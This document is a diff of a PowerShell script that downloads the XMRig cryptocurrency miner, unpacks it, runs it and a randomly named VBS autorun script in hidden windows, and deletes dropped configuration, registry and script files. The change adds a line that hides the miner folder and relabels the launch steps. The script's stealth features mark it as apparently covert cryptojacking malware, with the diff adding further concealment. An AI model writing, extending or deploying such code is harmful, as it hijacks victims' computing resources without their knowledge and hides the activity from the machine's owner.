@@ -93,7 +93,7 @@ $currentDir = $Pwd
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
-
+Set-ItemProperty -Path "initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"
 
 # Replace XMRig Configuration File
 $newConfigPath = "$path\config.json"
@@ -181,15 +181,17 @@ if (Test-Path -Path '.Venom' -PathType Container) {
     Exit 1
 }
 
-# Start Rig
+
 cd $path
 Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
+# Start Autorun
 cd $initial_dir
 Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
 
+# Start Rig
 Start-Process -windowstyle hidden -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" 
 
 # Pause for 200 seconds
